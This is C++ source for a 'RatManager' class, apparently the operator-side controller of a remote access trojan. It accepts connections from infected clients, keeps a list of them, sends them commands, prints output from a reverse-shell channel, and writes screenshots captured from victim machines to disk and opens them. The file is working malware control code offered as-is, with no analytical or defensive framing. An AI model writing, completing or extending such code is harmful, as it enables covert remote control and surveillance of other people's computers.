#include "RatManager.h"

#include <fstream>
#include <Windows.h>

#include "Trace.h"
#include "Format.h"

RatManager::RatManager(
	ICommunicationFactory* factory, 
	std::unique_ptr<IConnectionListener> server
):
	_factory(factory),
	_server(std::move(server)),
	_listenThread(MakeThreadGuard(
		std::thread(&RatManager::Listen, this))),
	_clientCount(0),
	_isTerminationRequested(false)
{
}

RatManager::~RatManager()
{
	_isTerminationRequested = true;
}

int RatManager::GetClientCount() const
{
	return _clientCount;
}

ClientInfo* RatManager::GetClients()
{
	std::lock_guard guard(_clientsLock);

	const auto clients = new ClientInfo[_clients.size()];

	int index = 0;
	for (const auto& pipe : _clients)
	{
		std::string str = pipe->GetConnection()->GetAddress();

		std::copy_n(
			str.c_str(), 
			str.size() + 1,
			clients[index].Address);

		index++;
	}

	return clients;
}

void RatManager::Send(const int client, const MessageType type, const SharedSpan content)
{
	std::lock_guard guard(_clientsLock);

	_clients[client]->GetSender()->Send(type, content);
}

void RatManager::Join()
{
	std::lock_guard guard(_clientsLock);

	std::ranges::for_each(
		_clients, 
		[](const std::shared_ptr<IClientPipe>& client) { client->GetListener()->Join(); });
}

void RatManager::Listen()
{
	while (!_isTerminationRequested)
	{
		const auto index = std::make_shared<int>(_clientCount);

		auto client = _server->WaitForConnection();

		auto messageSender = _factory->CreateMessageSender(client.get());

		auto messageListener = _factory->CreateMessageListener(
			client.get(),
			[this, index](auto type, auto content) { OnMessage(*index, type, content); },
			[this, index]() { OnDisconnection(*index); });

		std::lock_guard guard(_clientsLock);

		_clients.emplace_back(
			std::make_shared<ClientPipe>(
				std::move(client),
				std::move(messageSender),
				std::move(messageListener)));
		_clientCount++;

		Trace("\nClient %d connected\n", *index);
	}
}

void RatManager::OnDisconnection(const int client)
{
	std::lock_guard guard(_clientsLock);

	std::erase(_clients, _clients[client]);
	_clientCount--;

	Trace("\nClient %d disconnected\n", client);
}

std::string RatManager::FormatDate(const std::chrono::system_clock::time_point time)
{
	const std::time_t timeT = std::chrono::system_clock::to_time_t(time);

	std::string formattedString(30, '\0');

	tm timeInfo;
	localtime_s(&timeInfo, &timeT);

	std::strftime(
		&formattedString[0],
		formattedString.size(),
		"%Y-%m-%d %H-%M-%S",
		&timeInfo);

	return formattedString;
}

void RatManager::OnScreenshot(SharedSpan content)
{
	auto date = FormatDate(std::chrono::system_clock::now());

	auto fileName = Format("%s.png", date.c_str());

	std::ofstream(fileName, std::ios::binary)
		.write(content.begin(), content.size());

	ShellExecuteA(
		nullptr, 
		"open",
		fileName.c_str(),
		nullptr, 
		nullptr, 
		SW_SHOW);
}

void RatManager::OnMessage(const int client, const MessageType type, SharedSpan content)
{
	const auto str = content.toString();

	switch (type)
	{
		case MessageType::ReverseShellMessage:
			Trace("%s", str.c_str());
			break;

		case MessageType::Screenshot:
			
			OnScreenshot(content);
			break;


		default:
			Trace(
				"\nClient %d sent: %d %s",
				client,
				type,
				str.c_str()
			);
			break;
	}
	
}
